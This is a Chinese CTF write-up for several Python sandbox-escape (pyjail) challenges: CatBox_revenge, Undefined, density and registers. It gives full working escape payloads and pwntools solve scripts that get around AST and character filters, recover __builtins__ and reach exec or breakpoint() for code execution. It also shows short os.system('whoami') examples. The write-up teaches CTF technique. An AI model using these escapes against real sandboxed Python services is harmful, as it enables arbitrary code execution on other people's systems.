题面描述指向的就是去年的 `Pyjail`。revenge增加在了禁止 `ast.Call` 和禁止 `ast.Subscript`。  

绕过 `ast.Call` 这一点不用多讲，依旧采取装饰器，但我们注意到，去年恢复 `__builtins__` 采取的是 `builtins = val['__builtins__']` 此类形式，我们被禁用了 `ast.Subscript`。如何获取 `__builtins__`？  

这里的知识点是，`match-case` 还有一种模式，为映射模式，语法详情查看 [pep 634](https://peps.python.org/pep-0634/)。  

我们通过如下的代码  
```python
match dic:
    case {key : val}:
        print(val)
```

就可以通过映射模式和捕获模式，使得 val = dic[key]。就成功绕过了针对字典的 `ast.Subscript`。对于元组，列表一样可以利用 `match-case` 的别的模式进行绕过，此处按住不表。  

之后，我们把生成器生成的方式改一下即可，或者使用异常来进行栈帧逃逸。  


## CatBox_revenge

### Info
分数 : 500 pts  
出题人 : starwalking  
题目路径 : [CatBox_revenge](../../challenges/sandbox/CatBox_revenge/)  

### Payload

```python
[
d:=[]._＿doc_＿._＿doc_＿,
c:=d[8],h:=d[106],
r:=d[2],
obj:=cat,
[
    []
        for [obj._＿class_＿._＿getitem_＿] in [[
            [ [+obj] 
                for[obj._＿class_＿._＿pos_＿] in [[ []._＿class_＿._＿mro_＿[1]._＿subclasses_＿]] 
            ] [0][0][155]._＿init_＿._＿builtins_＿[c+h+r]
        ]]
],
exp:=obj[101]+obj[120]+obj[101]+obj[99]+obj[40]+obj[105]+obj[110]+obj[112]+obj[117]+obj[116]+obj[40]+obj[41]+obj[44]+obj[123]+obj[34]+obj[95]+obj[95]+obj[98]+obj[117]+obj[105]+obj[108]+obj[116]+obj[105]+obj[110]+obj[115]+obj[95]+obj[95]+obj[34]+obj[58]+obj[109]+obj[98]+obj[125]+obj[41],
si:=obj[105]+obj[110]+obj[112]+obj[117]+obj[116],
se:=obj[101]+obj[120]+obj[101]+obj[99],
mb:=[
    [+obj] 
        for [obj._＿class_＿._＿pos_＿] in [[ []._＿class_＿._＿mro_＿[1]._＿subclasses_＿ ]]
][0][0][155]._＿init_＿._＿builtins_＿,
exec:=mb[se],
input:=mb[si],
[obj[exp]for[obj._＿class_＿._＿getitem_＿]in[[exec]]]
]
```

不含特定class位置：
```python
[
obj:=cat,
doc:=[]._＿doc_＿._＿doc_＿,
swrap:=doc[84]+doc[2]+doc[76]+doc[149],
sclose:=doc[8]+doc[208]+doc[4]+doc[0]+doc[7],
schr:=doc[8]+doc[106]+doc[2],
sub:=[
    [+obj]
    for [obj._＿class_＿._＿pos_＿] in [[[]._＿class_＿._＿base_＿._＿subclasses_＿]]
][0][0],
wr := [
    [c][0]
    for [bak] in [[sub]]
    for [0][0] in [sub][0]
    for [bak] in [[bak[1:]]]
    if[bak][0]
    for [c] in [[bak[0]]]
    if [swrap][0] in [c._＿name_＿][0] and [sclose][0] in[c._＿name_＿][0]
][0],
mb:=wr._＿init_＿._＿builtins_＿,
[
    [] for [obj._＿class_＿._＿getitem_＿] in [[ mb[schr] ]]
],
exp:=obj[101]+obj[120]+obj[101]+obj[99]+obj[40]+obj[105]+obj[110]+obj[112]+obj[117]+obj[116]+obj[40]+obj[41]+obj[44]+obj[123]+obj[34]+obj[95]+obj[95]+obj[98]+obj[117]+obj[105]+obj[108]+obj[116]+obj[105]+obj[110]+obj[115]+obj[95]+obj[95]+obj[34]+obj[58]+obj[109]+obj[98]+obj[125]+obj[41],
sinput:=obj[105]+obj[110]+obj[112]+obj[117]+obj[116],
sexec:=obj[101]+obj[120]+obj[101]+obj[99],
exec:=mb[sexec],
input:=mb[sinput],
[
    obj[exp] for [obj._＿class_＿._＿getitem_＿] in[[exec]]
]
]
```

ps : 此处稍微排版方便阅读，实际提交时无空格，无换行  

### Explain

我们采取在 `Pyjail笑传之CallingComesBack` 中学到的方法，替换 `__pos__` 魔术方法实现无参函数调用即可拿到 `object` 的所有子类，当然，我们利用 `__getitem__` 和 `type.__subclasses__` 的无绑定来获取同样可以，只不过 Payload 中采取了前一种。  

之后采用列表推导式 和 in 运算去取出 `os._wrap_close` 类。而对于字符的获取，我们后续选择先替换 `__getitem__` 为 `chr`, 避免从 `__doc__` 中去取字符增加寻找的工作量。再采用构造 `"exec(input(),{"__builtins__:mb"})"` 去在新的输入流恢复 `__builtins__`，提交 `breakpoint()` 即可 

## Undefined

### Info
分数 : 500 pts  
出题人 : starwalking  
题目路径 : [Undefined](../../challenges/sandbox/revenge_jail/)  

### Payload

```python
for a in [lambda x:().__class__.__base__]:pass
@().__class__.__class__.__dict__['__subclasses__']
@a
async def s():pass
for B in [x.__init__.__globals__['__builtins__'] for x in s if  x.__name__ == '_wrap_close']:pass
for __builtins__['__import__'] in [B['__import__']]:pass
for __builtins__['breakpoint'] in [B['breakpoint']]:pass
@B['exec']
@B['input']
async def f():pass
```

### Explain

分析源码，源码把能定义的节点几乎都禁用了，看似没有任何招数去赋值。  
但是，我们可以用 `for` 去进行赋值，而 `for` 是 `ast.For` 节点，且与 C 不同的是，在 Python 中，`for` 是不会创建新作用域的，因此变量即使出了循环依旧有效，我们可以利用这点来进行赋值  

赋值了好像也没招，`ast.Call` 被禁用，我们像利用装饰器进行逃逸似乎也逃逸不了，因为 `ast.FunctionDef` 和 `ast.ClassDef` 被禁用，我们看似不能定义任何函数和类了，装饰器逃逸的前提不存在了。  

但异步函数的定义 `async def` 在 `ast` 中并非是 `ast.FunctionDef` 节点，而是 `ast.AsyncFunctionDef` 节点，因此，我们可以用 `astnc def` 去函数定义，毕竟我们需要的只是一个能够使用装饰器的载体，而不关心载体具体是什么。  

运用上述知识点，串联起来即可。

## density

### Info
分数 : 500 pts  
出题人 : starwalking  
题目路径 : [density](../../challenges/sandbox/density/)  

### Payload

```python
from pwn import *
import base64
import re

HOST = '127.0.0.1'
PORT = 1437
remote_on = True
p = remote(HOST,PORT) if remote_on else process(['python','./wrapper.py'])

def check():
    data = p.recvuntil(b'continue: ').decode()
    if '+' in data:
        pattern = r"'([^']+)'\+'([^']+)'"
        matches = re.search(pattern,data)
        s1 = matches.group(1)
        s2 = matches.group(2)
        answer = s1 + s2
    elif 'reverse' in data:
        pattern = r"'([^']+)'"
        matches = re.search(pattern,data)
        org = matches.group(1)
        answer = org[::-1]
    else:
        log.failure('Bad Send')
        return
    p.sendline(answer.encode())
    log.success(f'Send {answer}!')

if remote_on:
    check()

exp = """
[a:=((a.gi_frame.f_back.f_back)for(i)in[1])]
[a:=[(x)for(x)in(a)]]
for(a)in(a):break
[mybuiltins:=a.f_builtins]
__builtins__|=mybuiltins
class MetaClass(''.__class__.__base__.__class__):pass
for(MetaClass.__add__)in[exec]:pass
class Sub(metaclass=MetaClass):pass
Sub+"breakpoint()"
""".replace('\n','\r').replace(' ','\f')
exp = base64.b64encode(exp.encode())
p.sendlineafter(b'encoded:',exp)
p.interactive(prompt='')
```

### Explain

分析源码  
1. 禁用了 `ast.Call`, `ast.Assign`, `ast.Subscript` 节点  
2. 禁用了 `@`,空格，制表符，换行符，反斜杠五种字符

我们一个一个来尝试绕过  

`ast.Assign` 是最简单的绕过，只是禁用了基础的赋值语句，但是我们学过了，可以利用 for 循环来绕过，海象表达式也当然可以，海象表达式并不是 `ast.Assign` 节点。  

空格和制表符是一个问题，我们自然想回退到 `CatBox_revenge` 的办法，但是，我们和那道题不一样，这次，我们没有一个类实例了。而且那道题也仅仅禁用了空格，我们可以用制表符绕过，没有制表符和空格，我们貌似无法来分隔代码了。但由于一些历史原因，其实并非只有这两种字符可以分隔代码，这一点可以从官网文档的[词法分析](https://docs.python.org/zh-cn/3.14/reference/lexical_analysis.html)中得知，我们可以采取换页符 `\f` 进行分隔代码，而对于换行符 `\n` 我们同样可以采取回车符 `\r` 进行绕过  

反斜杠并非很有意义进行绕过，我们可以直接忽略这个限制。  

接下来是绕过 `ast.Call`了。由于禁止了`@`，导致我们无法采用装饰器进行一参函数绕过，假如我们没被禁用 `ast.Subscript` 呢, 对喜欢写类型注解的同学可能写过这样的代码。

```python
def func(grid : list[list[int]]) -> None:
    ...
```

这里我们知道 `list` 本质是一个 `class`，它也能用下标访问。至python3.7以来，为了泛型引入了 `__class_getitem__` 魔术方法。利用这点，我们可以按照替换 `__getitem__` 一样的方法去替换 `__class_getitem__`，譬如下面的示例：  

```python
import os
class Cls:pass
Cls.__class_getitem__ = os.system
Cls['whoami']
```

但是遗憾的是，禁用了`ast.Subscript`，导致我们无法使用这一招，但沿着这个思路，我们能不能找到别的利用的手段呢？  

答案是有，元类。  

在 Python 万物皆对象的理念中，类本身自然也是一个对象，元类就是控制类的类，类是类实例的模板，而元类则是类的模板，定义了类该干嘛，毕竟，谁规定类本身不能相加这些操作呢？  

譬如下面的代码：  

```python
import os
class MetaClass(type):
    __getitem__ = os.system

class Sub(metaclass = MetaClass):
    pass

Sub['whoami']
```

由于这一个特性，我们可以改换成别的方式，比如替换 `__add__` 方法，利用 `Sub + cmd` 的方式执行命令。  


但是，定义一个 class ，我们前文说过，依赖于 `__build_class__` 和 `__name__`。但 `Parens? No! Revenge` 那道题我们并不需要建立起一个 `class`，我们只是需要那样一个需要使用装饰器的载体，但本题我们确确实实需要真正的 `__build_class__` 去建立这个元类。我们该如何获取 `__builtins__` 呢？  

按照 revenge_jail 提到的栈帧逃逸，我们尝试利用这一点。  

我们这里采取生成器栈帧逃逸，可以参考这篇[博客](https://www.cnblogs.com/gaorenyusi/p/18242719)。  

但拿到 `__builtins__` 也没招，即使我们定义了如下代码。

```python
__builtins__ = my_builtins
```

一样会报错 `NameError: __build_class__ not found`。这是因为，我们只是创建了一个新的叫做 `__builtins__` 的变量，并不是更新我们原有的 `__builtins__`。

那我们该如何原地更新 `__builtins__` 而不是创建一个新的名叫 `__builtins__` 的变量呢？

根据 [pep 584](https://peps.python.org/pep-0584/),我们可以采取 `dic1 |= dic2` 的方式原地更新字典，这下，最后一块拼图也拿到了，全部拼起来，我们就成功解出了本题。  

## registers

### Info
分数 : 500 pts  
出题人 : starwalking  
题目路径 : [registers](../../challenges/sandbox/registers/)  

### Payload

```python
from pwn import *
import base64
import re

HOST = '127.0.0.1'
PORT = 1437
remote_on = True
p = remote(HOST,PORT) if remote_on else process(['python','./wrapper.py'])

def check() -> None:
    data = p.recvuntil(b'continue: ').decode()
    if '+' in data:
        pattern = r"'([^']+)'\+'([^']+)'"
        matches = re.search(pattern,data)
        s1 = matches.group(1)
        s2 = matches.group(2)
        answer = s1 + s2
    elif 'reverse' in data:
        pattern = r"'([^']+)'"
        matches = re.search(pattern,data)
        org = matches.group(1)
        answer = org[::-1]
    else:
        log.failure('Bad Send')
        return
    p.sendline(answer.encode())
    log.success(f'Send {answer}!')

if remote_on:
    check()

def choice(action: str) -> None:
    p.sendlineafter(b'operation:',action.encode())

def move(src: int,dst: int) -> None:
    choice('move')
    p.sendlineafter(b'From register:',str(src).encode())
    p.sendlineafter(b'To register:',str(dst).encode())

def get(index : int,attr : str) -> None:
    choice('get')
    p.sendlineafter(b'register:',str(index).encode())
    p.sendlineafter(b'attribute:',attr.encode())

def call(func : int, arg: int, ret: int) -> None:
    choice('call')
    p.sendlineafter(b'func register:',str(func).encode())
    p.sendlineafter(b'arg register:',str(arg).encode())
    p.sendlineafter(b'ret register:',str(ret).encode())

def show() -> None:
    choice('show')

def goodbye() -> None:
    choice('exit')

get(0,'__new__')
get(0,'__new__')
get(0,'__self__')
move(0,1)

#status
#regs[0] = object
#reg[1] = object

get(1,'__dir__')
call(1,0,2)
get(2,'__new__')
get(2,'__self__')

#status
#regs[0] = object
#regs[1] = object.__dir__
#regs[2] = list

move(2,3)
call(1,0,4)
get(3,'pop')
call(3,4,4)

#status
#regs[0] = object
#regs[1] = object.__dir__
#regs[2] = list
#regs[3] = list.pop
#regs[4] = '__class__'

move(0,1)
get(1,'__dict__')
get(1,'get')
call(1,4,1)
get(1,'__get__')
call(1,0,1)

#status
#regs[0] = object
#regs[1] = type
#regs[2] = list
#regs[3] = list.pop
#regs[4] = '__class__'

get(1,'__dict__')
call(2,1,5)
for _ in range(23):
    call(3,5,4)
get(1,'get')
call(1,4,1)
call(1,0,1)

#status
#regs[0] = object
#regs[1] = object.__subclasses__()
#regs[2] = list
#regs[3] = list.pop
#regs[4] = '__subclasses__'
#regs[5] is not important

for _ in range(68):
    call(3,1,4)
get(4,'__init__')
move(4,1)
get(4,'__new__')
get(4,'__self__')

#status
#regs[0] = object
#regs[1] = license.__class__.__init__
#regs[2] = list
#regs[3] = list.pop
#regs[4] = function
#regs[5] is not important

get(4,'__dict__')
call(2,4,5)
for _ in range(9):
    call(3,5,2)
get(4,'get')
call(4,2,4)
get(4,'__get__')
call(4,1,1)

#status
#regs[0] = object
#regs[1] = __builtins__
#regs[2] = '__builtins__'
#regs[3] = list.pop
#regs[4] and regs[5] are not important

move(0,4)
get(4,'__dir__')
call(4,0,4)
get(4,'__new__')
get(4,'__self__')
call(4,1,5)


#status
#regs[0] = object
#regs[1] = __builtins__
#regs[2] = '__builtins__'
#regs[3] = list.pop
#regs[4] = list
#regs[5] = list(__builtins__)

for _ in range(129):
    call(3,5,2)
get(1,'get')
call(1,2,3)
move(3,4)
call(3,3,3)
p.sendlineafter(b'input>',b'eval')
call(4,4,4)
p.sendlineafter(b'input>',b'breakpoint()')

#status
#regs[0] = object
#regs[1] = __builtins__.get
#regs[2] = 'input'
#regs[3] = 'eval'
#regs[4] = 'breakpoint()'
#regs[5] is not important

call(1,3,3)
call(3,4,4)

p.interactive(prompt='')
```

### Explain

分析源码，源码可以看作一个小 vm ，不过有一些特殊限制。  
1. 寄存器限制在6个，且初始化为 `None`  
2. `get` 方法可以获取寄存器的属性，但是属性的名称长度不能超过8, 而且原寄存器会被覆盖。  
3. `call` 方法能且只能选取一个寄存器作为参数，也就是说，我们只能实现一参函数调用。

我们先需要像办法获取 `object`，正常而言，我们可以通过 `None.__class__.__base__` 去进行获取  

但问题在于，`__class__` 这个属性，它不多不少，恰好超长度了，有9个字符  

我们需要了解的是 Python 中的一个奇妙属性 `__self__`  

查看 Python 文档关于 `__self__` 属性的[描述](https://docs.python.org/3/reference/datamodel.html#method.__self__)  

但文档也说明了，`method.__self__` 引用方法绑定到的类实例对象，但继续阅读，其实也会发现不一定是实例，也可以是类本身。  

对于下面的代码，我们将说明这一至关重要的一点  

```python
class Dog:
    def __init__(self,name):
        print('creating!')
        self.name = name
    
    def __new__(cls,*args,**kweargs):
        print('new!')
        instance = super().__new__(cls)
        return instance
```

当我们实例化这个类，执行 `dog = Dog('name')` 时，我们会看到输出
```text
new!
creating!
```  

`__new__` 在实例诞生之前即调用，理论上没实例可以供他作用，因此其 `__self__` 绑定到的是 `cls` 参数，也就是说，调用 `obj.__new__.__self__` 会绑定到 `obj.__class__`。 但这个机制只在 CPython 给某个类型专门写死了自绑定的 `__new__` 才会体现，一旦这个类没有属于自己的，和继承来不一样的 `tp_new` 实现，其 `__dict__` 就不会有专门的 `__new__` 条目, 查找时，便会顺着 `__mro__` 往上，查到第一个拥有自己 `__new__` 条目的祖先类，届时，就不一定是 `obj.__class__`, 得到的是祖先类，比如如下的代码：  

```python
class Test:
    pass

test = Test()
```

`test.__new__.__self__` 为 `object` 而非 `Test` 类。  

而对于 `__init__` 就并非这个问题，因为此时实例已经诞生，即使我们的 `Test` 并没有写 `__init__` 函数，一样能发现 `test.__init__.__self__` 绑定到的是 `test` 自身。

如此，我们只需要找到一个自身没有 `__new__` 的类，能成功溯源至 `object` 即可，很遗憾的是对于 `None.__class__` 即 `NoneType` 是存在 `__new__` 的，我们无法直接通过 `None` 进行溯源。但 `None.__new__.__class__` 即 `builtin_function_or_method` 不存在自己独有的`__new__`啊，且该类只继承自 `object`，这样 `object` 就通过 `None.__new__.__new__.__self__` 拿到手了。  

但问题来了，我们获取 `object` 的作用是什么呢，又不能执行 `object.__subclasses__()` 来获取子类，一是 `__subclasses__` 过长，二是题目给的调用必须一参函数调用，而 `object.__subclasses__` 是零参函数。  

第二个问题很好解决，我们之前学过，可以用 `type.__subclasses__(object)` 来绕过，这就是一参函数调用了。
过长问题的也好解决，假设我们已经有 `type` 的情况下，我们可以通过 `type.__dict__.get('__subclasses__')` 来过去函数，只需要找到一个方法能获取 `__sublasses__` 字符串即可。  

熟悉 Python 的同学都知道，对于一个 `list` 对象，其 `pop` 是具有返回值的，而不是直接删除最后一个元素，`pop` 函数实际是从取出最后一个元素，删除，然后返回它。  

假设我们已经有一个包含目标字符串的 `list` 对象 `lst`,我们通过类似 `type` 和 `object` 的绑定机制，使用 `list.pop(lst)` 来执行 `lst.pop()`

问题在于，这个 `lst` 对象如何获取，我们可以把 `type.__dict__` 去转换成 `list`，对于一个 `dict` 对象 `dic` 来说，执行 `list(dic)` 实际会取出 `dic` 的所有键，而显然 `__subclasses__`字符串是一个键，而对于 `list` 的获取用之前提到的 `__self__` 操作即可。  

目标明确，我们现在去拿 `type`。  

但当我们用类似的操作执行 `object.__dict__['__class__']` 的时候发现，得到的并不是 `type`，而是 `<attribute '__class__' of 'object' objects>`。  

有关这一点，我们就又得查询官方文档了，在[3.3.2.3节](https://docs.python.org/3/reference/datamodel.html#invoking-descriptors)能知道到我们的答案。  

从中，我们知道执行 `obj.attr` 时背后会又一套调用机制。

对于我们想要的 `object.__class__`,它触发的是实例绑定这条路线，尽管 `object` 是一个类，但它本身是元类 `type` 的一个实例。背后执行的等价逻辑为 `object.__dict__['__class__'].__get__(object,type(object))`。  

虽然我们从文档中看到格式为 `type(a).__dict__['x'].__get__(a,type(a))` ，但我们同样从文档中看到其查找机制是从`a.__dict__`开始的，然后才是`type(a).__dict__` 并继续从 `type(a)` 的基类查找。  

而由于 `__get__` 中的 `onwer` 参数可被省略，因此采取 `__get__(object)` 一样可行，这就成功变成了合适的一参函数进行调用获取 `type`。  

接着利用 `type.__dict__['__subclasses__'](object)` 即可成功获取 `object` 的所有子类，

通常我们会采取利用类似 `license.__class__.__init__.__builtins__` 的方式获取`__builtins__.__dict__` ，但是依旧，`__builtins__`太长了，我们采取同样的方式，改写成  
`type(license.__class__.__init__).__dict__.get('__builtins__').__get__(license.__class__.__init__)` 其中 `type(license.__class__.__init__)` 通过 `__new__ + __self__` 的方式进行获取即可，如此我们就恢复了 `__builtins__.__dict__`  

接下来我们通过先前的方式 `list` 化去获取字符，然后再用`get`去拿到`eval`和`input` 即可，拿到 `input` 我们就可以获取 `"breakpoint()"` 字符串了,接着 `eval` 执行即可进入调试状态进行RCE。  
至于为什么不直接拿 `breakpoint`呢？因为我们只能一参函数调用，而`breakpoint`不接受任何参数  

# 致谢 
感谢各位读者能阅读到这里，如有错误请指出